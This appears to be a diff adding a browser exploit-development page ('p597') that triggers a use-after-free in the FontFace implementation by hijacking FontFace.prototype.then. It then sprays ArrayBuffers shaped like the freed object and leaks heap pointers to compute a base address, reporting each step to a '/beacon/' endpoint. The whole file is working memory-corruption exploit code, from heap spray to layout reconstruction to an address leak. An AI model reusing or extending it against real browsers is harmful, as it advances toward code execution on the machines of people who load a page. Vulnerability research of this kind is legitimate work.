@@ -1,0 +1,248 @@
+<!--
+  p597: Diagnostic — can we read family() after FontFace UAF?
+
+  Uses proven UAF mechanism from p588b (FontFace.prototype.then intercept).
+  Single UAF, spray with controlled fill. After engine writes, test every
+  FontFace JS getter to see what they return.
+
+  Tests after UAF+spray+engine-write:
+  A: gPa.family — what does the getter return?
+  B: gPa.status, .style, .weight, .unicodeRange — each getter
+  C: document.fonts.check('12px pa') and check('12px sa')
+  D: document.fonts.forEach — is face still in set?
+  E: Re-add gPa to document.fonts, test family again
+  F: getComputedStyle on element with font-family
+  G: Full buffer dump at key offsets for layout analysis
+
+  CRASH_CLASS: HIGH (getters on UAF'd face may crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p597</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+window._pa=pa;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);       // rc seed
+  wQ(lane[j],0x08,0,0);     // zero WeakPtrFactory area
+  wQ(lane[j],0x10,0,0);     // zero
+  wQ(lane[j],0x18,0,0);     // zero
+  wQ(lane[j],0x20,0,0);     // zero
+  wQ(lane[j],0x28,0,0);     // zero
+  wQ(lane[j],0x30,0,0);     // zero m_family candidate
+  wQ(lane[j],0x38,0,0);     // zero
+  wQ(lane[j],0x40,0,0);     // zero
+  wQ(lane[j],0x48,0,0);     // zero
+  wQ(lane[j],0x50,0,0);     // zero
+  wQ(lane[j],0x58,0,0);     // null m_clients → engine allocates fresh table
+  wQ(lane[j],0x60,0,0);     // zero
+  wQ(lane[j],0x68,0,0);     // null m_wrapper
+  wQ(lane[j],0x70,0,0);     // zero
+  wQ(lane[j],0x78,0,0);     // zero
+  lane[j][0x80]=0;lane[j][0x81]=0;
+  lane[j][0x82]=3;           // status = Success
+  lane[j][0x83]=0;
+  lane[j][0x84]=0;
+  lane[j][0x85]=0xAA;        // m_mayBePurged sentinel
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Scan at 200ms — engine writes should be done
+setTimeout(function(){
+  var lane=window._l;if(!lane){b('NO-SPRAY');return;}
+  var pa=window._pa;
+  var hitIdx=-1;
+
+  // Find hit lane
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2 || t0){
+      hitIdx=i;break;
+    }
+  }
+
+  if(hitIdx<0){b('NO-HIT');phaseEnd();return;}
+
+  var v=lane[hitIdx];
+  var rc=rD(v,0);
+  b('HIT:lane='+hitIdx+',rc='+rc);
+
+  // Read T
+  var T=rQ(v,0x58);
+  b('T=0x'+T);
+
+  // Read W
+  var W=rQ(v,0x68);
+  b('W=0x'+W);
+
+  // Status + mayBePurged
+  b('ST='+v[0x82]+',MP='+v[0x85]);
+
+  // Compute B = T - 0x60
+  var t_lo=rD(v,0x58), t_hi=rD(v,0x5C);
+  var b_lo=t_lo-0x60, b_hi=t_hi;
+  if(b_lo<0){b_lo+=0x100000000;b_hi-=1;}
+  b('B=0x'+('00000000'+b_hi.toString(16)).slice(-8)+('00000000'+b_lo.toString(16)).slice(-8));
+
+  // Full dump of interesting offsets
+  b('DUMP:');
+  for(var off=0;off<=0xB8;off+=8){
+    b('+'+('00'+off.toString(16)).slice(-2)+'='+rQ(v,off));
+  }
+
+  // ==========================================
+  // TEST A: face.family getter
+  // ==========================================
+  b('TEST-A:family');
+  try{
+    var fam=pa.family;
+    b('A:family='+JSON.stringify(fam));
+  }catch(e){
+    b('A:ERR='+e.message);
+  }
+
+  // ==========================================
+  // TEST B: other getters
+  // ==========================================
+  b('TEST-B:getters');
+  try{ b('B:status='+JSON.stringify(pa.status)); }catch(e){ b('B:status-ERR='+e.message); }
+  try{ b('B:style='+JSON.stringify(pa.style)); }catch(e){ b('B:style-ERR='+e.message); }
+  try{ b('B:weight='+JSON.stringify(pa.weight)); }catch(e){ b('B:weight-ERR='+e.message); }
+  try{ b('B:unicodeRange='+JSON.stringify(pa.unicodeRange)); }catch(e){ b('B:ur-ERR='+e.message); }
+  try{ b('B:display='+JSON.stringify(pa.display)); }catch(e){ b('B:display-ERR='+e.message); }
+  try{ b('B:variant='+JSON.stringify(pa.variant)); }catch(e){ b('B:variant-ERR='+e.message); }
+  try{ b('B:stretch='+JSON.stringify(pa.stretch)); }catch(e){ b('B:stretch-ERR='+e.message); }
+  try{ b('B:featureSettings='+JSON.stringify(pa.featureSettings)); }catch(e){ b('B:fs-ERR='+e.message); }
+
+  // ==========================================
+  // TEST C: document.fonts operations
+  // ==========================================
+  b('TEST-C:docfonts');
+  try{
+    var c1=document.fonts.check('12px pa');
+    b('C:check-pa='+c1);
+  }catch(e){ b('C:check-pa-ERR='+e.message); }
+  try{
+    var c2=document.fonts.check('12px sa');
+    b('C:check-sa='+c2);
+  }catch(e){ b('C:check-sa-ERR='+e.message); }
+
+  // ==========================================
+  // TEST D: document.fonts.forEach
+  // ==========================================
+  b('TEST-D:forEach');
+  try{
+    var cnt=0;
+    document.fonts.forEach(function(f){
+      cnt++;
+      try{ b('D:face='+f.family+'/'+f.status); }catch(e2){ b('D:face-ERR'); }
+    });
+    b('D:count='+cnt);
+  }catch(e){ b('D:forEach-ERR='+e.message); }
+
+  // ==========================================
+  // TEST E: getComputedStyle
+  // ==========================================
+  b('TEST-E:computed');
+  try{
+    var sp=document.createElement('span');
+    sp.style.fontFamily="'pa',sans-serif";
+    sp.textContent='test';
+    document.body.appendChild(sp);
+    var cs=getComputedStyle(sp).fontFamily;
+    b('E:computed='+JSON.stringify(cs));
+    document.body.removeChild(sp);
+  }catch(e){ b('E:ERR='+e.message); }
+
+  // ==========================================
+  // TEST F: re-add to document.fonts
+  // ==========================================
+  b('TEST-F:readd');
+  try{
+    document.fonts.add(pa);
+    b('F:readded=OK');
+  }catch(e){ b('F:readd-ERR='+e.message); }
+  try{
+    var fam2=pa.family;
+    b('F:family-after='+JSON.stringify(fam2));
+  }catch(e){ b('F:family-after-ERR='+e.message); }
+  try{
+    var c3=document.fonts.check('12px pa');
+    b('F:check-after='+c3);
+  }catch(e){ b('F:check-after-ERR='+e.message); }
+
+  // ==========================================
+  // TEST G: try document.fonts.load() with pa's family
+  // ==========================================
+  b('TEST-G:load');
+  try{
+    document.fonts.load('12px pa').then(function(faces){
+      b('G:load-resolved,faces='+faces.length);
+      for(var i=0;i<faces.length;i++){
+        try{ b('G:face['+i+'].family='+faces[i].family); }catch(e3){ b('G:face-ERR'); }
+      }
+    }, function(err){
+      b('G:load-rejected='+err);
+    });
+  }catch(e){ b('G:load-ERR='+e.message); }
+
+  // ==========================================
+  // TEST H: buffer state after all tests
+  // ==========================================
+  setTimeout(function(){
+    b('TEST-H:post-dump');
+    var v2=lane[hitIdx];
+    b('H:rc='+rD(v2,0)+',T=0x'+rQ(v2,0x58)+',W=0x'+rQ(v2,0x68));
+    b('H:ST='+v2[0x82]+',MP='+v2[0x85]);
+    // Check if any offset changed
+    var changed=[];
+    for(var off=0;off<192;off++){
+      if(off===0||off===1||off===2||off===3)continue; // rc changes expected
+      if(off>=0x58&&off<0x60)continue; // T changes expected
+      if(off>=0x68&&off<0x70)continue; // W changes expected
+      if(off===0x82||off===0x85)continue; // status/MP expected
+      if(v2[off]!==0){
+        changed.push('+'+('00'+off.toString(16)).slice(-2)+'='+('00'+v2[off].toString(16)).slice(-2));
+      }
+    }
+    if(changed.length>0){
+      b('H:NONZERO='+changed.slice(0,20).join(','));
+    }else{
+      b('H:ALL-ZERO-OK');
+    }
+    phaseEnd();
+  }, 500);
+
+}, 200);
+}
+
+function phaseEnd(){
+  b('ALL-DONE');
+  setTimeout(function(){ b('ALIVE'); }, 500);
+}
+
+setTimeout(main, 50);
+setTimeout(function(){ b('ALIVE-FALLBACK'); }, 30000);
+</script></head><body></body></html>
